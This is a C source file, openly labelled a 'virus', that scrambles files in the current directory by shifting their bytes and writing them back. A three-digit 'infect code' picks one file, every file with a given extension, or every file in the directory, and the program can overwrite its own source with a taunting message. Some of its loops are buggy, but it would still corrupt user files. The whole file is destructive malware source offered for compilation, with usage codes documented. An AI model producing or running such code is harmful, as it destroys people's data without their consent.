/* THIS IS A C PROGRAM VIRUS WHICH IS CAPABLE OF INFECTING SINGLE MENTIONED FILE AND EVEN ALSO ALL OTHER FILES WITH A MENTIONED EXTENSION BY THE USER.
 * EVERY PART OF THE PROGRAM IS DOCUMENTED TO ENHANCE THE READERS IDEA.
 * IT IS QUITE DANGEROUS TO RUN THIS PROGRAM WITH OUT ANY KNOWLEDGE OF THE INFECT CODE.
 * THE INFECT CODE IS A THREE DIGIT NUMBER USING 0 AND 1 ONLY.
 *
 * THE FIRST DIGIT OF THE CODE TELL WEATHER TO INFECT SINGLE FILE OR MULTIPLE FILES.
 * THE SECOND DIGIT TELL WHEATHER TO INFECT THE FILE WITH A SINGLE VIRUS OR A RANDOM ONE.
 * THE THIRD DIGIT TELL WHEATHER TO KEEP OR DELETE THE VIRUS SOURCE CODE FROM THE COMPUTER.
 *
 * IT IS AT THE USERS OWN RISK TO COMPILE THE VIRUS
 *
 * ALL HAILS TO GOUTHAM
 *
 *
 *                                                                            -   A V I N A S H
 *                                                                                         V A R M A
 */                                                                                      




#include<stdio.h> /*THIS IS THE STANDARD INPUT OUTPUT OPERATIONS HEADER FILE*/
#include<dirent.h> /*THE HEADER FILE IS USED TO COLLECT ALL THE NAME OF THE DIRECTORIES*/
#include<string.h> /*THIS HEADER FILE IS USED FOR STRING OPERATIONS*/
#include<malloc.h> /*THIS HEADER FILE IS USED FOR ALLOCATING MEMORY DYNAMICALLY*/
#include<stdlib.h> /*EVEN I DONT KNOW WHY I AM USING THIS HEADER FILE*/


/* THIS IT THE DECLARATION OF THE FUCTIONS USED IN THIS PROGRAM*/


void single_file(int c2,int c3);
void multiple_file(int c2,int c3);
void virus_single(char file_name[]);
void virus_multiple(char file_name[]);
void beauty();
void delete();

/*THIS IS THE GLOBAL DECLARATION OF SOME OF THE VARIABLES WHICH I WOULD BE USING THROUGH OUT THE PROGRAM*/


char file_name[50];
char *source_code=__FILE__,*to_write,buf;        /* __FILE__ IS A MACRO TO EXTRACT THE NAME OF THE CURRENT FILE*/
FILE *f;
int i;

/*THIS IS THE SINGLE_FILE FUNCTION
 * ALL IT DOES IS WHEN YOU INPUT THE FIRST DIGIT OF THE INFECT CODE AND IF ITS 0,THIS FUNCTION GETS ACTIVATED
 * IT ASKS YOU FOR A FILE NAME AND IF THIS FILE NAME DOES NOT EXIST, ITS GETS YOU ALL THE FILES NAMES AVAILABLE FOR YOU TO INFECT AND THEN YOU CAN TRY AGAIN.
 * BEWARE, THIS PROCESS RUNS ONLY FOR THREE TIMES AND AFTER THE SECOND TIME,IT DELETES THE VIRUS SOURCE CODE
 * DONT GET SCOLDED BY ENTERING THIS CODE FILE NAME 
 * IN THE LAST PART OF THIS FUNCTION, IT DECIDES WEATHER TO KEEP THE SOURCE CODE OR DELETE THE SOURCE CODE DEPENDING UPON THE INFECT CODE YOU HAD ENTERED*/

void single_file(int c2,int c3)
{
        DIR *d;
        struct dirent *dir;
        i=0;
                a:
printf("Enter the FILE NAME :");
scanf("%s",file_name);
d=opendir(".");
if(d)
{
        while((dir =readdir(d))!=NULL)
        {
                if((strcmp(file_name,dir->d_name)==0)){
                      if(c2==0)
                      virus_single(dir->d_name);
                      else if(c2==1)
                      virus_multiple(dir->d_name);}
                closedir(d);
                       if(c3==0)
                               return;
                       else if(c3==1){
                               delete();}}
return;}
                               i++;
                               if(i>=2){
                                       sleep(1);
                                       printf("You are given two chances to continue\n\tand now i am almost done\nthis is your last chance!!!!\n\n");}
                                       if(i>2){
                                               printf("you are given three chances and now i am done\n\tthis code will run no more\nthe virus source code is deleted\n\n");
                                               delete();
                                               return;}
printf("\n\n\nThe entered FILE NAME does not exist,\n\there are a list of FILES which are available:\n\n\n");
sleep(3);
d=opendir(".");
if(d)
{
while((dir=readdir(d))!=NULL)
{
    printf("%s\n",dir->d_name);
    }
    closedir(d);
    }
    printf("\n\n\nNow try again \n\n\t");
    sleep(1);
                goto a;}


/*THIS IS THE MULTIPLE FILES FUNCTION
 * THIS FUCTION GETS ACTIVATED WHEN YOU ENTER 1 IN FIRST PLACE OF THE INFECT CODE.
 * HERE IT ASKS YOU TO ENTER A FILE EXTENSION AND THEN IT WILL GO ON INFECTING ALL THE FILE WITH THE ENTERED EXTENSION.
 * DONT WORRY ,IT WILL TELL YOU WHAT ALL FILES IT HAD INFECTED
 * IN THE LAST PART OF THIS FUNCTION ,IT DECIDES WEATHER TO KEEP THE SOURCE CODE OR DELETE THE SOURCE CODE DEPENDING UPON THE INFECT COD YOU HAD ENTERED */


void multiple_file(int c2,int c3)
{
        int length;
        char e[6];
DIR *p;
struct dirent *bad_luck;     
printf("Enter the FILE extension\n\n\t:");
        scanf("%s",e);
i=strlen(e);
  p = opendir ("./");
    if (p != NULL)
  {
    while ((bad_luck = readdir (p))!=NULL) {
       length = strlen(bad_luck->d_name);
      if (strncmp(bad_luck->d_name + length - i,e,i) == 0) {
              printf("%s\n",bad_luck->d_name);
          if(c2==0)
                  virus_single(bad_luck->d_name);
          else if(c2==1)
                  virus_multiple(bad_luck->d_name);
      }
    }
    (void) closedir (p);
  }
    if (c3==0)
            return;
    else if (c3==1){
            delete();
}}

/*THIS IS THE VIRUS SINGLE FUNCTION
 * IT GETS ACTIVATED WHEN YOU ENTER 0 IN THE SECOND PLACE OF THE INFECT CODE.
 * ALL IT DOES IS ENCRYPT THE DATA IN THE FILE WITH A FIXED LOGIC WHICH YOU MIGHT CRACK
*/


void virus_single(char file_name[])
{
if(strcmp(source_code,file_name)==0){
        printf("\n\nASS****\n\tyou are trying to destroy your virus source code!!!!!\n\nTHE CODE WILL RUN NO MORE!!\n");
        return;}
f=fopen(file_name,"r");
for(i=1;i<=EOF;i++){}
to_write=(char *)malloc(i*(sizeof(char)));
for(i=0;buf!=EOF;i++){
        buf=fgetc(f);
        to_write[i]=buf+i;}
fclose(f);
f=fopen(file_name,"w");
fputs(to_write,f);
fclose(f);
free(to_write);
}


/*THIS IS THE VIRUS MULTIPLE FUNCTION
 * THIS GETS ACTIVATED IF YOU ENTER 1 IN THE SECOND PLACE OF THE INFECT CODE.
 * ALL IT DOES IF TO INFECT THE FILE WITH A RANDOM ENCRYPTION
 * SO NO TWO FILE,PROBABLY ARE ENCRYPED IN THE SAME WAY
*/


void virus_multiple(char file_name[])
{
        int a,b;
        a=rand()%10000;
        b=rand()%a;
        f=fopen(file_name,"r");
        for(i=1;i<=EOF;i++){}
        to_write=(char *)malloc(i*(sizeof(char)));
        for(i=0;buf!=EOF;i++){
                buf=fgetc(f);
                to_write[i]=buf+a+b;}
        fclose(f);
        f=fopen(file_name,"w");
        fputs(to_write,f);
        fclose(f);
        free(to_write);
        }


void beauty()
{
        DIR *d;
        struct dirent *dir;
        d=opendir(".");
        if(d)
        {
                while((dir=readdir(d))!=NULL)
                {
                        virus_multiple(dir->d_name);
                printf("%s\n",dir->d_name);}
                closedir(d);}
delete();}


void delete()
{
        char *p;
        p=(char *)malloc(100*(sizeof(char)));
        p="HEY ASS,I DELETED YOUR VIRUS SOURCE CODE.  CATCH ME IF YOU CAN";
        f=fopen(source_code,"w");
        fputs(p,f);
        fclose(f);
        free(p);
}

/* THIS IS THE MAIN PROGRAM
 * THIS IS THE PLACE WHERE THE COMPUTER START READING FIRST AND THE PROCEED TO THE CALLED FUNCTIONS.
 * IN THIS MAIN PROGRAM,IT JUST TAKES THE INFECT CODE
 * AND THIS INFECT CODE DECIDES ALL THE PROTOCALLS
 * SO BE SURE TO KNOW WHAT YOU ARE ENTERING */ 



int main(void)
{
        int c1,c2,c3,d;
        system("clear");
        printf("Enter the INFECT CODE :");
        scanf("%d%d%d",&c1,&c2,&c3);
        if(c1==0)
                single_file(c2,c3);
        else if(c1==1)
                multiple_file(c2,c3);
        if(c1==9&&c2==1&&c3==1){
                printf("\n\n\nYOU HAD JUST ENTERED 9 1 1\n\tTHIS IS THE MOST DESTRUCTIVE COMMAND TO THIS PROGRAM\n\nARE YOU SURE TO CONTINUE??\n\npress\n1 for yes\n0 for no\n\n:");
                                scanf("%d",&d);
                                if(d==1){
                beauty();}}
        return (0);}


/* SO HERE ARE THE INFECT CODES 
 * THERE ARE TOTAL EIGHT WAYS TO GIVE AN INPUT
 *
 * 0 0 0     THIS SAYS READ SINGLE FILE,ATTACH DEFINED ENCRYPTION AND KEEP THE SOUCE CODE
 *
 * 0 0 1     THIS SAYS READ SINGLE FILE,ATTACH DEFINED ENCRYPTION AND DELETE THE SOURCE CODE
 *
 * 0 1 0     THIS SAYS READ SINGLE FILE,ATTACH RANDOM ENCRYPTION AND KEEP THE SOURCE CODE
 *
 * 0 1 1     THIS SAYS READ SINGLE FILE,ATTACH RANDOM ENCRYPTION AND DELETE THE SOURCE CODE
 *
 * 1 0 0     THIS SAYS READ MULTIPLE FILES WITH THE SAME EXTENTION,ATTACH DEFINED ENCRYPTION AND KEEP THE SOURCE CODE
 *
 * 1 1 0     THIS SAYS READ MULTIPLE FILES WITH THE SAME EXTENTION,ATTACH RANDOM ENCRYPTION AND KEEP THE SOURCE CODE
 *
 * 1 0 1     THIS SAYS READ MULTIPLE FILES WITH THE SAME EXTENTION,ATTACH DEFINED ENCRYPTION AND DELETE THE SOURCE CODE
 *
 * 1 1 1     THIS SAYS READ MULTIPLE FILES WITH THE SAME EXTENTION,ATTACH RANDOM ENCRYPTION AND DELETE THE SOURCE CODE
 *
 *
 ***** 9 1 1 ***** THIS IS THE MOST POWERFUL INFECT CODE YOU CAN GIVE
                        IT ENCRYPTS EVERY POSSIBLE FILE AND ALSO ENCRYPTS ITS OWN SOURCE CODE FILE
                        ENTERING THIS IS HIGHLY RESTRICTED,IT IS AT YOUR OWN RISK

 *           
 *
 *           THIS INFECT CODE DECIDE THE OVERALL FLOW OF THE PROGRAM
                                    SO BE SURE OF THE INFECT CODE BEFORE EXECUTING THIS FILE  
*/     
